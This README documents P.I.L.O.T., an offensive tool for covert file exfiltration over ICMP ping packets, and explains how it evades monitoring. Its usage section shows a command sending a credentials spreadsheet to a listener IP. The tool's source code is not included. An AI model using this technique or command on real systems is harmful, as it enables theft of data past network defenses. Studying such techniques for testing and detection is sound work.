# P.I.L.O.T - Ping-based Information Lookup and Outbound Transfer
Author - Dahvid Schloss

Pilot is a simplified system designed for the stealthy transfer of files across networks using ICMP (Internet Control Message Protocol) packets. This system comprises two main components: a PowerShell script for sending data and a Python script for receiving and reassembling the data. By leveraging ICMP, traditionally used for diagnostic purposes (e.g., ping), P.I.L.O.T enables the transmission of data in environments where traditional methods might be monitored or blocked.


### 1. PILOT (The Sender)

Breaks down files into 32-byte chunks and sends them over the network using ICMP echo requests. It includes functionality to send a preliminary packet containing file metadata (name, type, and total chunk count) before transmitting the data chunks. This is used for recompiling with the smae name and file type on the recieving end

Customization Options: 

-targetIP = Where is your listener default is 127.0.0.1

-filePath = What file do you want to send

-chunksize = This is the size of the file chunks. The default is 32 because layer 1-3 of ICMP packets are 32 and we are emualting MS's default behavior which is 64 byte packets. If you make it a larger chunk do not exceed 65507. Any deviation from default could result is easier dection

-delay = if you want to add some its done in miliseconds, no sorry, 1000 would be 1 second for those who don't know the metrics also would be more realistic to how ping works. Default is 0 though cause who wants to wait 5900 seconds for a file

### 2. ATC (The Reciever)

Listens for incoming ICMP packets, extracts the payload containing the file data or metadata, and reassembles the original file based on the chunks received. Very simple no options ez pz lemon squeezy

Requirements: Requires administrative privileges due to the use of raw sockets for listening to ICMP packets.

## How and Why It Works

File Preparation: The sender script reads the target file, breaking it into specified chunk sizes. It then generates a header packet containing the file's metadata.

Data Transmission: The sender script transmits the header packet followed by each data chunk as individual ICMP packets to the target IP address. Each transmission's success is verified, and the process can be halted if a transmission fails.

Data Reception: The receiver script continuously listens for ICMP packets, extracting the transmitted data. Upon receiving the header packet, it prepares to reconstruct the original file based on the total chunks expected.

File Reassembly: Once all chunks are received, the receiver script reassembles and saves the file using the metadata provided in the header packet.


Now the reason this attack vector works is all down to how ICMP is structured. First we should look at the ICMP packet as two parts, 1 part is comprised of layer 1-3 and the second part is layer 4

Becuase layer 4 is involved it means there is more data involved in the packet than just the where to go info. 

To break down The header and data payload of the packet we have the following sections;

- Type (8 bits): Indicates the type of the ICMP message, e.g., Echo Request (8) or Echo Reply (0).

- Code (8 bits): Provides further information about the message type.

- Checksum (16 bits): Used for error-checking the header and data, ensuring the integrity of the message.

- Other Fields (variable): Depending on the type/code of the ICMP message, these fields may vary. For Echo Request and Echo Reply messages, these include an identifier and a sequence number, both 16 bits long.

- Data Payload: This portion of the packet is where data is included and can vary in size. In the context of Echo Request/Reply messages, this is typically where arbitrary data is placed for the echo operation.

Normally this Data payload section of the packet is used by network engineers to determine their max MTU size for the connection and if you adjust the data size using ping this data section is filled with very random data to fill the space to bring it up to what ever the requested  size is. By default Microsoft puts the alphabet in the packet so at a minimum there is 64 bytes. 
Now because its a defined strucute it means that there are plenty of tools orgnanic to programming languages to manipulate these layer 4 items like data. So what we are doing here is exactly that we are chunking out the files and then putting them in the data section of the packet and on the distant end we are reading the packet's data section. 


## Setup & Usage

### Sender Setup

Open powershell and import the script

`.\PILOT.ps1`

execute the script

`run-pilot -targetIP 192.168.10.10 -filePath .\sweetsweetcreds.xls`

### Receiver Setup

Ensure Python 3.x is installed on your system, with administrative or root access to listen for ICMP packets.

Run the Python receiver script. The script will automatically listen and save the incoming file. You will need a new listener for each new file 

## Security Considerations

Use P.I.L.O.T within legal and ethical boundaries. It is designed for secure environments, research, and testing purposes.
Be aware of network monitoring tools that may detect unusual ICMP traffic.


## Final Notes

P.I.L.O.T represents a novel approach to data transfer, showcasing the flexibility of network protocols for beyond-standard uses. Whether for penetration testing, secure file transfer in restricted environments, or research, P.I.L.O.T offers a unique tool in the cybersecurity toolkit.
